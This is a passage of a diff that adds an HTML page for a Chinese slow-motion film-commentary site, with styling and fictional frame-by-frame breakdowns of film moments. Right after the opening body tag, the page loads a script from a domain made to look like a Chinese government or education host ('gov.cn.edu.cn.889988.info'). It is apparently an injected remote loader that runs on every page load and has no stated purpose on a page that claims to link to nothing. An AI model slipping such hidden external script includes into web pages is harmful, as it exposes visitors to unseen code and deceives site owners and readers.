@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, viewport-fit=cover" />
+<title>蜗牛影视 - 慢镜头观影档案·你漏掉的那一秒才是整部片 | woniuyingshi-h5.github.io</title>
+<meta name="description" content="蜗牛影视（woniuyingshi-h5.github.io）慢镜头观影档案：把被2倍速吞掉的哪一帧一格格摊开。帧格拆解、拖影细节、长镜头笔记、留白时刻——纯文字策展，不播片、不存片、不链片、不提供任何下载或解析。" />
+<meta name="keywords" content="蜗牛影视,woniuyingshi-h5,慢镜头,帧格拆解,长镜头,观影细节,电影笔记,倍速之外,帧分析" />
+<meta name="author" content="蜗牛影视 · 慢镜头档案" />
+<meta name="robots" content="index,follow" />
+<link rel="canonical" href="https://woniuyingshi-h5.github.io/" />
+<style>
+/* ============ 蜗牛影视 · 慢镜头档案 ============
+   结构：横向帧带（filmstrip）+ 拖影层 + 长曝光块
+   与承认影视(纵轴)／水密桃(四象限)／生活影视(网格) 全部不同 DOM
+   配色：银盐灰 / 胶片黑 / 荧光苔绿 / 慢闪琥珀
+*/
+:root{
+  --silver:#E6E2DA;--paper:#F0EDE6;--black:#161612;--soft:#6B675C;
+  --grey:#9A9385;--moss:#7CCBA8;--moss2:#3E8A68;--amber:#E0A03A;--line:rgba(22,22,18,.18);
+  --strip:9;--maxw:1180px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;background:var(--paper);color:var(--black);
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  line-height:1.85;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;
+  overflow-x:hidden;
+}
+/* 中文正文用衬线感，仅长文块 */
+.serif{font-family:"Noto Serif SC","Songti SC","STSong",Georgia,serif}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 18px}
+
+/* ---- 帧格顶栏 ---- */
+.strip-top{
+  height:26px;background:var(--black);
+  mask-image:repeating-linear-gradient(90deg,#000 0 30px,transparent 30px 34px);
+  -webkit-mask-image:repeating-linear-gradient(90deg,#000 0 30px,transparent 30px 34px);
+  position:relative;
+}
+.strip-top::after{content:"";position:absolute;inset:0;background:linear-gradient(90deg,transparent,var(--moss),transparent);background-size:200% 100%;animation:sweep 8s linear infinite}
+@keyframes sweep{to{background-position:200% 0}}
+
+header.bar{position:sticky;top:0;z-index:60;background:rgba(240,237,230,.96);backdrop-filter:blur(14px);border-bottom:2px solid var(--black)}
+.bar-in{max-width:var(--maxw);margin:0 auto;padding:0 18px;height:60px;display:flex;align-items:center;gap:14px}
+.brand{display:flex;align-items:center;gap:11px;font-weight:900;letter-spacing:2px;font-size:18px}
+.frame-cell{width:34px;height:26px;flex:none;background:var(--black);border:2px solid var(--black);position:relative;overflow:hidden}
+.frame-cell i{position:absolute;left:0;top:0;bottom:0;width:6px;background:var(--moss);animation:slide 2.6s ease-in-out infinite alternate}
+@keyframes slide{0%{transform:translateX(0)}100%{transform:translateX(24px)}}
+.brand small{display:block;font-family:"Courier New",monospace;font-size:8px;color:var(--grey);letter-spacing:1.5px;font-weight:600}
+.nav{margin-left:auto;display:flex;gap:2px;align-items:center}
+.nav a{padding:7px 12px;font-size:12.5px;font-weight:700;color:var(--black);letter-spacing:.5px}
+.nav a:hover{background:var(--black);color:var(--paper)}
+.nav a.here{background:var(--moss2);color:#fff}
+.nav .pip{width:5px;height:5px;background:var(--amber);border-radius:50%;margin:0 4px;animation:blip 1.8s steps(2) infinite}
+@keyframes blip{50%{opacity:.15}}
+.search{display:flex;border:1.5px solid var(--line);background:#fff}
+.search input{border:0;outline:0;padding:7px 11px;width:132px;font-size:12.5px;background:transparent;color:var(--black)}
+.search input::placeholder{color:var(--grey)}
+.search button{border:0;border-left:1.5px solid var(--line);background:var(--black);color:var(--paper);padding:0 12px;font-weight:800;cursor:pointer;font-size:11px;font-family:"Courier New",monospace;letter-spacing:1px}
+.burger{display:none;margin-left:auto;border:1.5px solid var(--black);background:#fff;padding:5px 10px;font-size:15px;color:var(--black);cursor:pointer}
+
+/* ---- Hero：拖影大字 ---- */
+.hero{position:relative;padding:70px 0 54px;overflow:hidden;border-bottom:1px solid var(--line);background:
+  radial-gradient(1100px 400px at 88% 8%,rgba(124,203,168,.18),transparent),
+  radial-gradient(700px 320px at 8% 95%,rgba(224,160,58,.14),transparent),
+  var(--paper)}
+.hero::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(90deg,transparent 0 33px,rgba(22,22,18,.035) 33px 34px);pointer-events:none}
+.drag{font-family:"Courier New",monospace;font-size:11px;letter-spacing:6px;color:var(--moss2);font-weight:800;margin-bottom:18px;display:flex;gap:12px;align-items:center}
+.drag::before{content:"";width:40px;height:2px;background:var(--moss2);display:inline-block}
+.hero h1{
+  font-size:clamp(38px,8vw,80px);line-height:.98;margin:0;font-weight:950;letter-spacing:-1px;
+  position:relative;
+}
+/* 拖影三层 */
+.hero h1 .s{
+  display:block;position:relative;white-space:nowrap;
+  text-shadow:2px 0 0 rgba(124,203,168,.55),5px 0 0 rgba(124,203,168,.30),9px 0 0 rgba(124,203,168,.14);
+  animation:drag 4.2s ease-in-out infinite alternate;
+}
+@keyframes drag{0%{text-shadow:2px 0 0 rgba(124,203,168,.6),6px 0 0 rgba(124,203,168,.3),11px 0 0 rgba(124,203,168,.12)}
+  100%{text-shadow:6px 0 0 rgba(224,160,58,.5),16px 0 0 rgba(224,160,58,.22),26px 0 0 rgba(224,160,58,.08)}}
+.hero h1 .dot{color:var(--amber);font-style:normal}
+.hero .sub{font-family:"Courier New",monospace;font-size:12px;letter-spacing:4px;color:var(--grey);margin-top:16px;display:block}
+.hero p.lede{margin:22px 0 0;color:var(--soft);font-size:16px;max-width:32em;position:relative}
+.hero p.lede b{color:var(--black);background:linear-gradient(transparent 66%,var(--moss) 66%);padding:0 2px}
+.speed{display:flex;gap:0;margin-top:26px;position:relative;flex-wrap:wrap}
+.speed div{border:1.5px solid var(--black);border-right:0;padding:11px 16px;background:#fff;flex:1;min-width:120px}
+.speed div:last-child{border-right:1.5px solid var(--black)}
+.speed b{display:block;font-family:"Courier New",monospace;font-size:19px;font-weight:900;letter-spacing:1px}
+.speed b.off{color:var(--moss2)}
+.speed span{font-size:10.5px;color:var(--soft);letter-spacing:.5px}
+.cta{display:flex;gap:8px;margin-top:24px;flex-wrap:wrap;position:relative}
+.cta a{font-size:13px;font-weight:800;padding:10px 22px;border:1.5px solid var(--black)}
+.cta a.pri{background:var(--black);color:var(--paper)}
+.cta a.sec{background:#fff;color:var(--black)}
+.cta a:hover{background:var(--moss2);border-color:var(--moss2);color:#fff}
+
+/* ---- 帧带（DOM 差异化核心：横向滚动 + 每格独立） ---- */
+section{padding:52px 0;border-bottom:1px solid var(--line)}
+.sec-head{display:flex;gap:16px;align-items:flex-end;flex-wrap:wrap;margin-bottom:24px;padding-bottom:12px;border-bottom:3px solid var(--black)}
+.sec-head .no{font-family:"Courier New",monospace;font-size:13px;font-weight:900;color:var(--moss2);letter-spacing:2px;line-height:1}
+.sec-head h2{margin:0;font-size:24px;font-weight:950;letter-spacing:.5px;flex:1;min-width:200px}
+.sec-head h2 small{display:block;font-family:"Courier New",monospace;font-size:10px;color:var(--grey);letter-spacing:2px;font-weight:600;margin-top:4px}
+.sec-head .more{font-family:"Courier New",monospace;font-size:11px;color:var(--moss2);font-weight:800;letter-spacing:1px;white-space:nowrap}
+
+.filmstrip{
+  display:flex;gap:10px;overflow-x:auto;padding:6px 2px 18px;scroll-snap-type:x mandatory;
+  scrollbar-width:none;-webkit-overflow-scrolling:touch;
+}
+.filmstrip::-webkit-scrollbar{display:none}
+.cell{
+  flex:0 0 276px;scroll-snap-align:start;background:#fff;border:1.5px solid var(--black);
+  border-top-width:6px;border-top-color:var(--black);position:relative;transition:.25s;
+  display:flex;flex-direction:column;
+}
+.cell:hover{transform:translateY(-5px);border-top-color:var(--moss2);box-shadow:0 14px 30px rgba(22,22,18,.12)}
+.cell .grab{aspect-ratio:16/10;position:relative;overflow:hidden;background:
+   linear-gradient(112deg,var(--silver),#d8d3c8);
+  display:flex;align-items:flex-end;padding:12px}
+.cell .grab::after{content:"";position:absolute;inset:0;background:
+   repeating-linear-gradient(90deg,transparent 0 33px,rgba(22,22,18,.06) 33px 34px)}
+/* 每格一张不同的"定格"抽象图 */
+.cell:nth-child(1) .grab{background:linear-gradient(112deg,#cfd8d0,#9bbfaa)}
+.cell:nth-child(2) .grab{background:linear-gradient(112deg,#e4dccb,#d0a95c)}
+.cell:nth-child(3) .grab{background:linear-gradient(112deg,#d6d2cf,#8d8880)}
+.cell:nth-child(4) .grab{background:linear-gradient(112deg,#cfe0e8,#7fa8b8)}
+.cell:nth-child(5) .grab{background:linear-gradient(112deg,#e8d5d5,#c98a7a)}
+.cell:nth-child(6) .grab{background:linear-gradient(112deg,#ded8c6,#a9b37a)}
+.cell .grab .fx{position:absolute;left:var(--x,20%);top:var(--y,38%);width:60px;height:2px;background:var(--black);opacity:.5;transform:rotate(var(--r,12deg))}
+.cell .grab .fx2{position:absolute;left:var(--x2,52%);top:var(--y2,55%);width:26px;height:26px;border:2px solid var(--black);border-radius:50%;opacity:.35}
+.cell .grab h4{position:relative;z-index:1;margin:0;color:var(--black);font-size:15px;font-weight:950;line-height:1.25;mix-blend-mode:multiply}
+.cell .grab .fr{position:absolute;top:8px;left:8px;z-index:2;font-family:"Courier New",monospace;font-size:8.5px;font-weight:900;color:#fff;background:var(--black);padding:2px 5px;letter-spacing:1px}
+.cell .body{padding:14px 14px 16px;flex:1;display:flex;flex-direction:column}
+.cell .body .when{font-family:"Courier New",monospace;font-size:9.5px;color:var(--moss2);font-weight:800;letter-spacing:1.5px}
+.cell .body h3{margin:5px 0 6px;font-size:15.5px;font-weight:900;line-height:1.4}
+.cell .body p{margin:0 0 10px;font-size:12.5px;color:var(--soft);line-height:1.72;flex:1}
+.cell .body .pull{font-weight:800;color:var(--black);font-size:12.5px;background:linear-gradient(transparent 62%,var(--amber) 62%);display:inline}
+.cell .body .tag{font-family:"Courier New",monospace;font-size:9px;color:var(--grey);border-top:1px dashed var(--line);padding-top:8px;margin-top:auto;display:flex;justify-content:space-between;letter-spacing:.5px}
+.cell .body .tag b{color:var(--black)}
+
+/* ---- 栏目二：长曝光块（宽屏双栏，第二种 DOM） ---- */
+.long{
+  display:grid;grid-template-columns:1.15fr .85fr;gap:0;border:2px solid var(--black);background:var(--black);color:var(--paper);overflow:hidden;
+}
+.long .left{padding:34px 30px;position:relative;background:
+   radial-gradient(600px 240px at 80% 20%,rgba(124,203,168,.16),transparent),#161612}
+.long .left .frame-tag{font-family:"Courier New",monospace;font-size:10px;letter-spacing:4px;color:var(--moss);font-weight:800}
+.long .left h3{font-size:clamp(22px,3.4vw,34px);margin:12px 0 10px;font-weight:950;line-height:1.25}
+.long .left h3 em{font-style:normal;color:var(--amber)}
+.long .left p{color:#c4bfb3;font-size:14.5px;line-height:1.85;margin:0 0 12px;max-width:34em}
+.long .left .rule{font-family:"Courier New",monospace;font-size:10.5px;color:var(--moss);letter-spacing:1px;border-top:1px solid rgba(255,255,255,.18);padding-top:10px}
+.long .right{background:var(--silver);color:var(--black);padding:0;display:flex;flex-direction:column}
+.long .right .row{padding:16px 20px;border-bottom:1px solid rgba(22,22,18,.18);flex:1}
+.long .right .row:last-child{border-bottom:0}
+.long .right .t{font-family:"Courier New",monospace;font-size:9.5px;font-weight:900;color:var(--moss2);letter-spacing:1.5px}
+.long .right h4{margin:4px 0 4px;font-size:14px;font-weight:900}
+.long .right p{margin:0;font-size:12px;color:var(--soft);line-height:1.65}
+.long .right .sec-dot{display:inline-block;width:6px;height:6px;background:var(--amber);border-radius:50%;margin-left:6px;animation:blip 1.6s steps(2) infinite}
+
+/* ---- 栏目三：秒表拆解表（table，第三种 DOM） ---- */
+.timer{width:100%;border-collapse:collapse;background:#fff;border:1.5px solid var(--black);font-size:13px}
+.timer th{background:var(--black);color:var(--paper);text-align:left;padding:11px 14px;font-family:"Courier New",monospace;font-size:10px;letter-spacing:2px;font-weight:800}
+.timer td{padding:13px 14px;border-bottom:1px solid var(--line);vertical-align:top;line-height:1.65}
+.timer tr:last-child td{border-bottom:0}
+.timer tr:hover td{background:#f4f7f2}
+.timer .tc{font-family:"Courier New",monospace;font-weight:900;color:var(--moss2);white-space:nowrap;font-size:12px}
+.timer .tc b{color:var(--amber)}
+.timer td h4{margin:0 0 3px;font-size:13.5px;font-weight:900}
+.timer td p{margin:0;color:var(--soft);font-size:12px}
+.timer .flag{font-family:"Courier New",monospace;font-size:9.5px;font-weight:800;color:var(--grey);white-space:nowrap}
+.timer .flag.on{color:var(--paper);background:var(--black);padding:1px 6px}
+
+/* ---- 栏目四：留白墙（grid auto-fill，第四种 DOM） ---- */
+.pause{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:12px}
+.pause .p{background:#fff;border:1.5px solid var(--line);border-left:4px solid var(--amber);padding:18px 16px;min-height:150px;transition:.2s}
+.pause .p:hover{border-color:var(--black);border-left-color:var(--moss2);transform:translateY(-3px)}
+.pause .p .n{font-family:"Courier New",monospace;font-size:10px;font-weight:900;color:var(--amber);letter-spacing:2px}
+.pause .p h4{margin:7px 0 6px;font-size:14.5px;font-weight:900;line-height:1.4}
+.pause .p p{margin:0;font-size:12px;color:var(--soft);line-height:1.65}
+.pause .p .len{font-family:"Courier New",monospace;font-size:9.5px;color:var(--grey);margin-top:10px;border-top:1px dashed var(--line);padding-top:6px}
+
+/* ---- 栏目五：声明折叠（details，第五种） ---- */
+.faq details{border:1.5px solid var(--line);background:#fff;margin-bottom:9px}
+.faq details[open]{border-color:var(--black);box-shadow:7px 7px 0 rgba(22,22,18,.08)}
+.faq summary{cursor:pointer;padding:15px 18px;font-weight:900;font-size:14.5px;list-style:none;display:flex;gap:12px;align-items:center}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::before{content:"▸";font-family:"Courier New",monospace;color:var(--moss2);font-size:14px;transition:.15s}
+.faq details[open] summary::before{transform:rotate(90deg)}
+.faq summary .k{margin-left:auto;font-family:"Courier New",monospace;font-size:9.5px;color:var(--grey);font-weight:800;letter-spacing:1px}
+.faq .body{padding:0 18px 16px 44px;color:var(--soft);font-size:13px;line-height:1.85;border-top:1px dashed var(--line);padding-top:12px}
+.faq .body code{font-family:"Courier New",monospace;font-size:11px;background:var(--silver);border:1px solid var(--line);padding:1px 6px;color:var(--moss2)}
+.faq .body b{color:var(--black)}
+.warn{border-color:var(--amber);background:#fbf3e4}
+.warn summary{color:#8a5a10}
+
+/* ---- 关于 ---- */
+.about{display:grid;grid-template-columns:1.2fr .8fr;gap:24px;align-items:start}
+.txt{background:#fff;border:1.5px solid var(--line);padding:28px}
+.txt h3{margin:0 0 12px;font-size:19px;font-weight:950}
+.txt h3::before{content:"⌘ ";color:var(--moss2);font-family:"Courier New",monospace}
+.txt p{margin:0 0 12px;color:var(--soft);font-size:14px}
+.txt p:last-child{margin:0}
+.gauge{border:2px solid var(--black);background:var(--black);color:var(--paper);padding:24px}
+.gauge h4{margin:0 0 16px;font-family:"Courier New",monospace;font-size:11px;letter-spacing:3px;color:var(--moss);font-weight:800}
+.gauge .row{display:flex;gap:12px;align-items:center;font-size:12.5px;margin-bottom:12px}
+.gauge .nm{width:88px;flex:none;font-family:"Courier New",monospace;font-size:10.5px;color:#c4bfb3;letter-spacing:.5px}
+.gauge .bar{flex:1;height:6px;background:rgba(255,255,255,.14);overflow:hidden}
+.gauge .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--moss),var(--amber));width:var(--w,40%)}
+.gauge .row b{font-family:"Courier New",monospace;font-size:11px;color:var(--amber);width:34px;text-align:right}
+
+footer{background:var(--black);color:#c4bfb3;padding:36px 0 46px;margin-top:0}
+footer .wrap{display:grid;grid-template-columns:1.3fr 1fr;gap:24px}
+footer h4{margin:0 0 10px;font-size:17px;color:#fff;letter-spacing:3px;font-weight:950}
+footer h4 span{color:var(--moss)}
+footer p{margin:0;font-size:12px;line-height:1.9;color:#a8a294}
+footer .mono{font-family:"Courier New",monospace;font-size:11px;color:var(--moss);word-break:break-all;letter-spacing:.5px}
+footer .rule{font-family:"Courier New",monospace;font-size:9.5px;color:#6f6a5e;margin-top:10px;letter-spacing:.5px;line-height:1.7}
+.copy{margin-top:26px;padding-top:16px;border-top:1px solid rgba(255,255,255,.16);font-family:"Courier New",monospace;font-size:10px;color:#6f6a5e;text-align:center;letter-spacing:1px}
+
+/* ---- 响应式 ---- */
+@media(max-width:900px){
+  .long{grid-template-columns:1fr}
+  .long .right{border-top:2px solid var(--black)}
+  .about{grid-template-columns:1fr}
+  footer .wrap{grid-template-columns:1fr}
+  .speed div{min-width:calc(50% - 1px);border-bottom:1.5px solid var(--black)}
+  .speed div:nth-child(odd){border-right:1.5px solid var(--black)}
+  .speed div:nth-child(1),.speed div:nth-child(2){border-bottom:0}
+}
+@media(max-width:720px){
+  .nav{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;background:var(--paper);border-bottom:2px solid var(--black);padding:10px 18px;gap:0}
+  .nav.open{display:flex}
+  .nav a{padding:11px 10px;border-bottom:1px solid var(--line)}
+  .nav .pip{display:none}
+  .burger{display:block}
+  .search{margin-left:auto;margin-right:8px}
+  .search input{width:88px}
+  .sec-head{flex-direction:column;align-items:flex-start;gap:6px}
+  .hero{padding:42px 0 34px}
+  .cell{flex-basis:230px}
+  .timer{font-size:11.5px;display:block;overflow-x:auto}
+  .timer thead{display:none}
+  .timer tr{display:block;border:1.5px solid var(--line);margin-bottom:9px;background:#fff}
+  .timer td{display:block;border-bottom:1px dashed var(--line);padding:9px 12px}
+  .timer td:last-child{border-bottom:0}
+  .timer td::before{content:attr(data-l)"：";font-family:"Courier New",monospace;font-size:9px;color:var(--moss2);font-weight:800;letter-spacing:1px}
+}
+@media print{
+  .strip-top,.nav,.search,.burger,.cta{display:none}
+  body{background:#fff}
+  .filmstrip{overflow:visible;flex-wrap:wrap}
+  .cell{flex:0 0 calc(50% - 5px)}
+  .hero h1 .s{text-shadow:none;animation:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="strip-top" role="presentation"></div>
+
+<header class="bar">
+  <div class="bar-in">
+    <div class="brand">
+      <div class="frame-cell" aria-hidden="true"><i></i></div>
+      <div>蜗牛影视<small>SLOW-MO ARCHIVE · 帧格拆解</small></div>
+    </div>
+    <nav class="nav" id="nav">
+      <a href="#one" class="here">帧带</a><span class="pip" aria-hidden="true"></span>
+      <a href="#two">长曝光</a><span class="pip" aria-hidden="true"></span>
+      <a href="#three">一秒表</a><span class="pip" aria-hidden="true"></span>
+      <a href="#four">留白格</a><span class="pip" aria-hidden="true"></span>
+      <a href="#five">立场</a>
+    </nav>
+    <div class="search">
+      <input type="text" placeholder="找一帧：比如“转身前那三秒”" aria-label="检索帧格" />
+      <button type="button" onclick="alert('帧格检索演示：本页不返回任何资源链接')">逐帧</button>
+    </div>
+    <button class="burger" id="burger" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main>
+
+  <!-- ============ HERO ============ -->
+  <section class="hero" id="top">
+    <div class="wrap">
+      <div class="drag">SLOW · MO · ARCHIVE — 倍速之外的那一格</div>
+      <h1><span class="s">你漏掉的<span class="dot">那</span>一秒</span><span class="s" style="animation-delay:.6s">才是整部片<span class="dot">。</span></span></h1>
+      <span class="sub">蜗牛影视 · 慢镜头观影档案 ／ 别人按 2x 追完，我们一格格摊开</span>
+      <p class="lede">2 倍速省下的是时间，吞掉的是<b>伏笔、呼吸、和演员决定不演的那一下</b>。我们不给你片源，只给你<b>被倍速删掉的那一帧</b>：一个转身前的停顿、杯沿的一次反光、字幕切走时背景里的一声。<br/>在这儿，慢不是缺点，<strong>慢是唯一的操作系统。</strong></p>
+      <div class="speed" aria-label="倍速对照">
+        <div><b>2.0x</b><span>现在的大多数人</span></div>
+        <div><b>1.0x</b><span>影院里的正常人</span></div>
+        <div><b class="off">0.5x</b><span>我们干活的地方</span></div>
+        <div><b class="off">单帧</b><span>这页真正卖的</span></div>
+      </div>
+      <div class="cta">
+        <a class="pri" href="#one">从帧带开始</a>
+        <a class="sec" href="#four">先学停三秒</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目一：横向帧带 ============ -->
+  <section id="one" data-role="栏目 · 帧带">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">01/FRAME</div>
+        <h2>帧带 <small>FRAME STRIP · 横着滑，一格一格，别跳</small></h2>
+        <a class="more" href="#">— 整条胶片 #</a>
+      </div>
+
+      <div class="filmstrip">
+
+        <article class="cell">
+          <div class="grab"><span class="fr">FR 00:41</span><span class="fx" style="--x:22%;--y:40%;--r:14deg"></span><span class="fx2" style="--x2:62%;--y2:52%"></span><h4>门把手<br>松开的那个角度</h4></div>
+          <div class="body">
+            <div class="when">TURN / 转身前</div>
+            <h3>他没回头，但手在门把上多停了半拍</h3>
+            <p>台词早就说完了，戏才刚开始。那一停不是犹豫，是<b class="pull">把"算了"咽回去</b>的动作。倍速滑过去，你会以为他只是急着走。</p>
+            <div class="tag"><span>看 <b>手</b></span><span>时长 11 帧</span></div>
+          </div>
+        </article>
+
+        <article class="cell">
+          <div class="grab"><span class="fr">FR 01:08</span><span class="fx" style="--x:30%;--y:55%;--r:-8deg"></span><span class="fx2" style="--x2:70%;--y2:38%"></span><h4>杯沿的<br>一次反光</h4></div>
+          <div class="body">
+            <div class="when">SILENCE / 沉默</div>
+            <h3>全场没台词，光在杯子上走了一圈</h3>
+            <p>两个人把架吵完了，谁都没挂电话。镜头死死盯着那只没喝完的杯子——<b class="pull">反光替他们把气叹了</b>。这是剪辑师偷偷塞的第三个角色。</p>
+            <div class="tag"><span>看 <b>光</b></span><span>时长 2.4 秒</span></div>
+          </div>
+        </article>
+
+        <article class="cell">
+          <div class="grab"><span class="fr">FR 02:33</span><span class="fx" style="--x:18%;--y:45%;--r:3deg"></span><span class="fx2" style="--x2:55%;--y2:60%"></span><h4>背景里<br>那声呼吸</h4></div>
+          <div class="body">
+            <div class="when">AFTER / 字幕之后</div>
+            <h3>字幕切走了，背景才闷响一下</h3>
+            <p>你以为这场戏收了。其实配乐撤掉之后，走廊尽头有人吸了一下鼻子。<b class="pull">真正的结尾在第 0.8 秒</b>，也就是你掏手机的那一刻。</p>
+            <div class="tag"><span>听 <b>尾音</b></span><span>时长 0.8 秒</span></div>
+          </div>
+        </article>
+
+        <article class="cell">
+          <div class="grab"><span class="fr">FR 03:17</span><span class="fx" style="--x:40%;--y:35%;--r:-16deg"></span><span class="fx2" style="--x2:45%;--y2:58%"></span><h4>没接住的<br>那个眼神</h4></div>
+          <div class="body">
+            <div class="when">CUT / 反打</div>
+            <h3>她看过来，镜头却先切了</h3>
+            <p>最狠的反打是"不给"。导演让你等着，等你替角色难受。<b class="pull">没接住的眼神比接住的贵三倍</b>，可惜倍速下你只会觉得"这儿剪坏了"。</p>
+            <div class="tag"><span>看 <b>空缺</b></span><span>时长 1 帧</span></div>
+          </div>
+        </article>
+
+        <article class="cell">
+          <div class="grab"><span class="fr">FR 04:02</span><span class="fx" style="--x:26%;--y:50%;--r:9deg"></span><span class="fx2" style="--x2:66%;--y2:44%"></span><h4>雨停前<br>三秒的静</h4></div>
+          <div class="body">
+            <div class="when">WEATHER / 天气</div>
+            <h3>雨是先停的，人才后知后觉</h3>
+            <p>屋檐滴水从密到疏，中间有三秒真空。演员没动，剧情没进，<b class="pull">但屏幕外的你突然能喘气了</b>。这是声音设计在替角色哭。</p>
+            <div class="tag"><span>听 <b>雨</b></span><span>时长 3.1 秒</span></div>
+          </div>
+        </article>
+
+        <article class="cell">
+          <div class="grab"><span class="fr">FR 05:44</span><span class="fx" style="--x:34%;--y:42%;--r:-4deg"></span><span class="fx2" style="--x2:60%;--y2:56%"></span><h4>道具师<br>藏的句号</h4></div>
+          <div class="body">
+            <div class="when">PROP / 细节</div>
+            <h3>桌上那封信，从第一集就没拆开</h3>
+            <p>到第 22 集镜头扫过，封口还是旧的。没人提，道具师也不邀功。<b class="pull">最安静的伏笔不靠台词，靠一张纸的褶皱</b>。逐帧才找得回来。</p>
+            <div class="tag"><span>找 <b>褶皱</b></span><span>跨度 22 集</span></div>
+          </div>
+        </article>
+
+      </div>
+      <p style="font-size:11px;color:var(--grey);margin:12px 0 0">※ 以上"帧格"均为<b>虚构的拆解示例</b>，用于演示"慢镜头读法"，不指向任何具体作品的剧照、片段或资源。本页不含可播放视听素材。</p>
+    </div>
+  </section>
+
+  <!-- ============ 栏目二：长曝光 ============ -->
+  <section id="two" data-role="栏目 · 长曝光">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">02/LONG</div>
+        <h2>长曝光 <small>LONG EXPOSURE · 一整段戏，只写一件事</small></h2>
+        <a class="more" href="#">— 更多长读 #</a>
+      </div>
+
+      <div class="long">
+        <div class="left">
+          <div class="frame-tag">CASE · 一次没剪的饭桌</div>
+          <h3>七分钟，<em>没人</em>说那件事<br>可你比他们先哭</h3>
+          <p>一家人围着吃面，镜头没切过一次。筷子碰碗、汤凉了、母亲把碟子转了半圈又转回来——<strong>那件"天塌了的事"谁都没提</strong>，但你看见父亲的拇指一直在搓桌沿。</p>
+          <p>倍速看这是"废戏"，逐帧看这是全片最贵的一场：<span style="color:var(--amber)">演员用不演，把你逼哭了。</span>慢镜头的活儿不是放大，是<b>还你被剧情抢走的观察权</b>。</p>
+          <div class="rule">READING NOTE · 看这场戏别盯脸，盯手、盯碗、盯没人动的那双筷子。／ 全程无剧透，因我们不谈剧情，只谈怎么看。</div>
+        </div>
+        <div class="right">
+          <div class="row"><div class="t">LAYER 01<span class="sec-dot"></span></div><h4>拇指搓桌沿</h4><p>父亲的台词。每搓一下，是半句没说出来。</p></div>
+          <div class="row"><div class="t">LAYER 02</div><h4>碟子转了半圈</h4><p>母亲唯一的控制欲出口：先把菜摆正，情绪才能摆正。</p></div>
+          <div class="row"><div class="t">LAYER 03</div><h4>凉了的汤面</h4><p>道具在计时。面越凉，那件没说的事越烫。</p></div>
+          <div class="row"><div class="t">LAYER 04</div><h4>镜头的呼吸</h4><p>它微微收拢再推出去，像一次替所有人深呼吸。</p></div>
+          <div class="row"><div class="t">LAYER 05</div><h4>你自己的静音</h4><p>第五层在你身上：屏幕暗下去时，你有没有放下手机。</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目三：一秒表 ============ -->
+  <section id="three" data-role="栏目 · 一秒表">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="no">03/TIME</div>
+        <h2>一秒表 <small>ONE-SECOND LOG · 值得被放大的一格</small></h2>
+        <a class="more" href="#">— 完整日志 #</a>
+      </div>
+
+      <table class="timer">
+        <thead>
+          <tr><th data-l="帧点">帧点</th><th data-l="那一格">那一格在发生什么</th><th data-l="为什么值">为什么值 0.5x</th><th data-l="类型">类型</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="tc" data-l="帧点"><b>00:41</b>·18f</td>
+            <td data-l="那一格"><h4>门把手松开的角度</h4><p>手指从扣紧到摊开，中间有一个"想再扣一次"的回弹。</p></td>
+            <td data-l="为什么值"><p>这是角色唯一一次<b>对自己诚实</b>，台词全程在撒谎。</p></td>
+            <td class="flag on" data-l="类型">微动作</td>
+          </tr>
+          <tr>
+            <td class="tc" data-l="帧点"><b>01:08</b>·62f</td>
+            <td data-l="那一格"><h4>杯沿反光走了一圈</h4><p>没有人物动，光自己完成了一次情绪曲线。</p></td>
+            <td data-l="为什么值"><p>剪辑师把<b>配乐该干的活交给了灯光</b>，高级的省事。</p></td>
+            <td class="flag" data-l="类型">光影</td>
+          </tr>
+          <tr>
+            <td class="tc" data-l="帧点"><b>02:33</b>·24f</td>
+            <td data-l="那一格"><h4>字幕切走后的闷响</h4><p>安静 0.8 秒，走廊尽头一声吸鼻子。</p></td>
+            <td data-l="为什么值"><p>真正的结局藏在<b>你以为已经结束之后</b>，别急着划走。</p></td>
+            <td class="flag" data-l="类型">声音</td>
+          </tr>
+          <tr>
+            <td class="tc" data-l="帧点"><b>03:17</b>·1f</td>
+            <td data-l="那一格"><h4>没给的反打</h4><p>她看过来，镜头先切了。</p></td>
+            <td data-l="为什么值"><p>"不给"是比"给"更贵的调度，<b>空缺本身就是表演</b>。</p></td>
+            <td class="flag on" data-l="类型">留白</td>
+          </tr>
+          <tr>
+            <td class="tc" data-l="帧点"><b>04:02</b>·76f</td>
+            <td data-l="那一格"><h4>雨停前的三秒真空</h4><p>屋檐从密到疏，中间一段干净的无声。</p></td>
+            <td data-l="为什么值"><p>天气先释怀，人才敢跟着松。这是<b>声音设计的慈悲</b>。</p></td>
+            <td class="flag" data-l="类型">声音</td>
+          </tr>
+          <tr>
+            <td class="tc" data-l="帧点"><b>05:44</b>·跨22集</td>
+            <td data-l="那一格"><h4>没拆封的信</h4><p>封口从第一集到结局都是旧的。</p></td>
+            <td data-l="为什么值"><p>道具师埋了 22 集的哑谜，<b>逐帧党才配拆开</b>。</p></td>
+            <td class="flag" data-l="类型">伏笔</td>
+          </tr>
+        </tbody>
+      </table>
+      <p style="font-size:11px;color:var(--grey);margin:10px 0 0">※ 时码与帧数为演示用虚构样本，不代表任何作品的实际剪辑点。用法：学"怎么看"，别当"去哪看"的索引。</p>
+    </div>
+  </section>
+
+  <!-- ============ 栏目四：留白墙 ============ -->
